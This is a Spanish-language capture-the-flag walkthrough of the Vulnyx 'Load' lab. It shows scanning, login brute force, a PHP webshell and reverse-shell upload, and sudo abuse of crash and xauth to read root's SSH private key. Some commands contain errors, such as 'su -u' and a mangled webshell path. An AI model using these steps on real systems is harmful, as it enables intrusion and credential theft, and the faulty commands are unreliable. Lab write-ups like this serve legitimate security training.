# Vulnyx-Load

## Identificación de la IP en la red
```bash
arp-scan -I eth0 --localnet
# (IP-victima)  08:00:27:d7:78:45       PCS Systemtechnik GmbH
```

## Escaneo de Puertos
```bash
nmap -p- -sV -sC -sS --min-rate 2000 -vvv -n -Pn (IP-victima) -oN nmap
# 22/tcp   abierto    ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
# 80/tcp   abierto    http    Apache httpd 2.4.57 ((Debian))
# [Contenido de robots.txt]: /ritedev/
```

## Fuzzing
```bash
wfuzz --hc=404 -u http://(IP-victima)/ritedev/FUZZ.php -w /usr/share/wfuzz/wordlist/general/medium.txt
# admin.php
```

Dentro de `admin.php` encontramos un panel de login. Intentaremos realizar un ataque de fuerza bruta utilizando Burp Suite.

## Fuerza Bruta con Burp Suite
1. Abrimos Burp Suite.
2. Configuramos el proxy.
3. Interceptamos la solicitud.
4. Enviamos al Intruder.
5. Por defecto, usamos "admin" como usuario.
6. Mediante Sniper, enviamos ataques de fuerza bruta al password.

Descubrimos que la contraseña es "admin". Ahora tenemos el usuario y la contraseña. Ingresamos y descubrimos que podemos subir documentos en formato .php. Procedemos a subir un archivo de reverseshell en php.

Al subir el archivo, no encontramos la ruta. Buscamos en internet la posible ruta por defecto donde se sube el archivo y encontramos varias opciones.

```bash
# Ejemplos encontrados:
http://(IP-victima)/ritecms.v3.0/webshell.php?cmd='whoami'
http://(IP-victima)/ritecms.v3/webshell.php?cmd=whoami
http://(IP-victima)/webshell.php?cmd=whoami
http://(IP-victima)/ritecms.v3.0/media/webshell.php?cmd=whoami
http://(IP-victima)/ritecms.v3.1.0/media/webshell.php?cmd=whoami
http://(IP-victima)/ritecms.v3.1/media/webshell.php?cmd=whoami
http://(IP-victima)/ritecms.v3.1.0/webshell.php?cmd=whoami
```

Después de probar varias opciones, encontramos los siguientes resultados positivos:

```bash
http://(IP-victima)/ritedev/media/pwned.phpwp-load.php?cmd=%27whoami%27
# www-data
```

Dado que exploit-db nos proporciona un ejemplo de webshell, probamos con eso, pero preferimos ingresar directamente mediante la reverseshell.

```bash
http://(IP-victima)/ritedev/media/pentestmonkey.php
```

Ahora estamos dentro.

```bash
whoami
# www-data
```

Toca realizar el tratamiento de la TTY y escalar privilegios.

```bash
script /dev/null -c bash
control+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

```bash
sudo -l
# (travis) NOPASSWD: /usr/bin/crash
```

Podemos ejecutar `crash` como `travis`.

```bash
su -u travis /usr/bin/crash -h
# !/bin/bash
```

Al poner `-h`, nos permite ejecutar algunos comandos.

```bash
!/bin/bash
```

Ya nos da una bash como `travis`.

```bash
whoami
# travis
```

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/xauth
```

Podemos ejecutar `xauth` como root.

```bash
/usr/bin/xauth -h
```

Entre las opciones, podemos leer comandos desde archivos con el comando "source".

```bash
source filename   # read commands from file
```

Podemos leer archivos, así que apuntamos a leer el `id_rsa` de root.

```bash
sudo /usr/bin/xauth source /root/.ssh/id_rsa+
# Esa es la ruta por defecto del id_rsa
```

Ya tenemos el `id_rsa` de root. Ahora toca modificarlo para poder utilizarlo.

```bash
nano id_rsa
# Pegamos el contenido
```

Toca modificarlo para que quede correcto.

```bash
cut -d " " -f 5 archivo.txt
# Esto elimina las columnas innecesarias
```

```bash
sed 's/"//g' archivo.txt
# Esto elimina las comillas
```

Ahora, dejamos bien la estructura reemplazando el principio y el final por lo siguiente:

```
-----BEGIN RSA PRIVATE KEY-----
-----END RSA PRIVATE KEY-----
```

Ingresamos vía SSH con el `id_rsa`.

```bash
ssh -i id_rsa root@(IP-victima)
```

```bash
whoami
# root
```

Ahora somos root (:D).
